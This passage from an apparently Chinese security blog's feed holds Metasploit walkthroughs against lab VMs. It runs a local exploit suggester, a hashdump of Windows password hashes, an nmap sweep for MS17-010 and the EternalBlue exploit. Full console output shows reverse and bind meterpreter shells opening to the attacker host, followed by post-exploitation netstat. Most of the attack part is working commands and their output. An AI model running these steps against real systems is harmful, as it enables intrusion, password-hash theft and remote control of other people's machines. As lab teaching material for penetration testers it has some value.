title="post/multi/recon/local_exploit_suggester"></a>post/multi/recon/local_exploit_suggester</h3><p>假设我们拿到一个<code>cmdshell</code>，但是权限很小，那我们可以使用这个模块来建议我们提权：</p><blockquote><p>post/multi/recon/local_exploit_suggester</p></blockquote><p>下面是它的一个介绍:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; info post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">       Name: Multi Recon Local Exploit Suggester</span><br><span class="line">     Module: post/multi/recon/local_exploit_suggester</span><br><span class="line">   Platform: Unknown, Windows, Netware, Android, Java, R, Ruby, Linux, Cisco, Juniper, Unifi, Brocade, Solaris, OSX, BSD, OpenBSD, BSDi, NetBSD, FreeBSD, AIX, HPUX, Irix, Unix, PHP, JavaScript, Python, NodeJS, Firefox, Mainframe, Multi, Hardware, Apple_iOS</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line">  Mo</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line">  Shell</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  SESSION                           yes       The session to run this module on</span><br><span class="line">  SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module suggests local meterpreter exploits that can be used. </span><br><span class="line">  The exploits are suggested based on the architecture and platform </span><br><span class="line">  that the user has a shell opened as well as the available exploits </span><br><span class="line">  in meterpreter. It&#x27;s important to note that not all local exploits </span><br><span class="line">  will be fired. Exploits are chosen based on these conditions: </span><br><span class="line">  session type, platform, architecture, and required default options.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面的<code>banner</code>可以看到，它支持的平台挺多的，比如<code>windows</code>、<code>Android</code>…等等</p><p>run运行后它会比较慢，因为它会查询<code>systeminfo</code>来看看那些补丁没打，从而探测可以使用那些<code>exploit</code>来进行提权：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/429.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">[*] 192.168.119.139 - Collecting local exploits for x64/windows...</span><br><span class="line">[*] 192.168.119.139 - 11 exploit checks are being tried...</span><br><span class="line">[+] 192.168.119.139 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.119.139 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>run执行完毕后，msf给出了我们两个<code>exploit</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line"></span><br><span class="line">exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.</span><br></pre></td></tr></table></figure><p>我使用<code>ms10_092_schelevator</code>提权失败了，然后又下面这个成功提权！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/431.png" alt="图片"></p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><code>hashdump</code>是查询密码：</p><p>因为有时候你得搜集密码来进行爆破别的用户</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/430.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hack:1001:aad3b435b51404eeaad3b435b51404ee:f39934a2710a469b3c63ce1487794514:::</span><br><span class="line">liuwx:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit与Nmap组合拳对内网进行Ms17-010(永恒之蓝)攻击</title>
      <link href="/2019/10/10/metasploit-7/"/>
      <url>/2019/10/10/metasploit-7/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=3027645&auto=1&height=66"></iframe><h2 id="使用Nmap扫描ms17-010"><a href="#使用Nmap扫描ms17-010" class="headerlink" title="使用Nmap扫描ms17-010"></a>使用Nmap扫描ms17-010</h2><p>使用<code>Nmap</code>探测内网<code>192.168.119.1</code>的<code>C</code>段下那些主机开放了<code>445</code>端口已经存在<code>ms17-010</code>漏洞</p><blockquote><p>nmap -p445 –script smb-vuln-ms17-010 192.168.1.1/24</p></blockquote><p>由于我的内网<code>IP</code>是<code>192.168.119.136</code>,所以就用这条命令:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/422.png" alt="图片"></p><blockquote><p>nmap -p445 –script smb-vuln-ms17-010 192.168.1.1/24</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~# nmap -p445 --script smb-vuln-ms17-010 192.168.119.1/24 </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-10 21:10 CST</span><br><span class="line">Nmap scan report for 192.168.119.1</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.119.2</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">445/tcp closed microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:E0:1A:4E (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.119.139</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:BF:20:28 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.119.254</span><br><span class="line">Host is up (0.00067s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE    SERVICE</span><br><span class="line">445/tcp filtered microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:EF:68:01 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.119.136</span><br><span class="line">Host is up (0.000033s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">445/tcp closed microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 2.46 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/423.png" alt="图片"></p><p>从上图可以看出，在内网中<code>192.168.119.139</code>这台主机存在<code>ms-17-010</code>漏洞！</p><h2 id="exploit利用ms17-010"><a href="#exploit利用ms17-010" class="headerlink" title="exploit利用ms17-010"></a>exploit利用ms17-010</h2><p>直接上命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/424.png" alt="图片"></p><p>设置好目标<code>IP</code>,然后run：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:4444 </span><br><span class="line">[+] 192.168.119.139:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.119.139:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.119.139:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.119.139:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.119.139:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.119.139:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.119.139:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.119.139:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.119.139:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.119.139:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.119.139:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.119.139:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.119.139:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.119.139:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.119.139:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.119.139:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.119.139:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.119.139:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.119.139:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.119.139:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 4 opened (192.168.119.136:4444 -&gt; 192.168.119.139:49169) at 2019-10-10 21:14:11 +0800</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/425.png" alt="图片"></p><p>利用永恒之蓝成功！但返回的只是一个<code>cmdshell</code></p><p>因为msf默认用的paylaod是：<code>payload/windows/x64/shell/reverse_tcp</code></p><p>我们可以设置成其他<code>payload</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>设置好了show options看需要设置的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.119.139  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.119.136  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般来说只要设置<code>rhosts</code>和<code>rport</code>就OK了，其他的msf会自动帮你设置!</p><p>最后<code>exploit</code>运行看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:4444 </span><br><span class="line">[+] 192.168.119.139:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.119.139:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.119.139:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.119.139:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.119.139:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.119.139:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.119.139:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.119.139:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.119.139:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.119.139:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.119.139:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.119.139:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.119.139:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.119.139:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.119.139:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.119.139:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.119.139:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.119.139:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.119.139:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.119.139:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.119.139</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.119.136:4444 -&gt; 192.168.119.139:49211) at 2019-10-10 21:24:40 +0800</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.119.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，这个时候就反弹的就是一个<code>meterpreter</code>会话,具体有哪些功能呵呵，你懂得~</p><h2 id="使用正向的payload也是可以的"><a href="#使用正向的payload也是可以的" class="headerlink" title="使用正向的payload也是可以的"></a>使用正向的payload也是可以的</h2><blockquote><p>set payload windows/x64/meterpreter/bind_tcp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address                    Remote address         State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------                    --------------         -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135                      0.0.0.0:*              LISTEN       0     0      712/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445                      0.0.0.0:*              LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:5357                     0.0.0.0:*              LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:49152                    0.0.0.0:*              LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp    0.0.0.0:49153                    0.0.0.0:*              LISTEN       0     0      764/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49154                    0.0.0.0:*              LISTEN       0     0      928/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49155                    0.0.0.0:*              LISTEN       0     0      496/services.exe</span><br><span class="line">    tcp    0.0.0.0:49156                    0.0.0.0:*              LISTEN       0     0      2028/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49157                    0.0.0.0:*              LISTEN       0     0      504/lsass.exe</span><br><span class="line">    tcp    192.168.119.139:139              0.0.0.0:*              LISTEN       0     0      4/System</span><br><span class="line">    tcp    192.168.119.139:4444             192.168.119.136:45747  ESTABLISHED  0     0      1248/spoolsv.exe</span><br><span class="line">    tcp    192.168.119.139:49159            192.168.119.136:4444   ESTABLISHED  0     0      1248/spoolsv.exe</span><br><span class="line">    tcp    192.168.119.139:49187            118.112.253.1:80       ESTABLISHED  0     0      928/svchost.exe</span><br><span class="line">    tcp    192.168.119.139:49188            63.147.242.144:80      ESTABLISHED  0     0      928/svchost.exe</span><br><span class="line">    tcp    192.168.119.139:49189            51.143.111.81:80       SYN_SENT     0     0      648/wermgr.exe</span><br><span class="line">    tcp6   :::135                           :::*                   LISTEN       0     0      712/svchost.exe</span><br><span class="line">    tcp6   :::445                           :::*                   LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::5357                          :::*                   LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::49152                         :::*                   LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp6   :::49153                         :::*                   LISTEN       0     0      764/svchost.exe</span><br><span class="line">    tcp6   :::49154                         :::*                   LISTEN       0     0      928/svchost.exe</span><br><span class="line">    tcp6   :::49155                         :::*                   LISTEN       0     0      496/services.exe</span><br><span class="line">    tcp6   :::49156                         :::*                   LISTEN       0     0      2028/svchost.exe</span><br><span class="line">    tcp6   :::49157                         :::*                   LISTEN       0     0      504/lsass.exe</span><br><span class="line">    udp    0.0.0.0:500                      0.0.0.0:*                           0     0      928/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    0.0.0.0:3702                     0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    0.0.0.0:4500                     0.0.0.0:*                           0     0      928/svchost.exe</span><br><span class="line">    udp    0.0.0.0:5355                     0.0.0.0:*                           0     0      984/svchost.exe</span><br><span class="line">    udp    0.0.0.0:61604                    0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    127.0.0.1:1900                   0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    127.0.0.1:65412                  0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    192.168.119.139:137              0.0.0.0:*                           0     0      4/System</span><br><span class="line">    udp    192.168.119.139:138              0.0.0.0:*                           0     0      4/System</span><br><span class="line">    udp    192.168.119.139:1900             0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp    192.168.119.139:65411            0.0.0.0:*                           0     0      1576/svchost.exe</span><br><span class="line">    udp6   :::500                           :::*                                0     0      928/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   :::3702                          :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   :::4500                          :::*                                0     0      928/svchost.exe</span><br><span class="line">    udp6   :::5355                          :::*                                0     0      984/svchost.exe</span><br><span class="line">    udp6   :::61605                         :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   ::1:1900                         :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   ::1:65410                        :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   fe80::f50f:3929:7979:5c54:1900   :::*                                0     0      1576/svchost.exe</span><br><span class="line">    udp6   fe80::f50f:3929:7979:5c54:65409  :::*                                0     0      1576/svchost.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看端口监听情况可以看到：</p><p><code>192.168.119.139:4444</code>与<code>192.168.119.136:45747</code>进行连接，注入进程是:<code>spoolsv.exe</code></p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit之各种Payload生成与实战作用详解（正向）</title>
      <link href="/2019/10/10/metasploit-6/"/>
      <url>/2019/10/10/metasploit-6/</url>
      
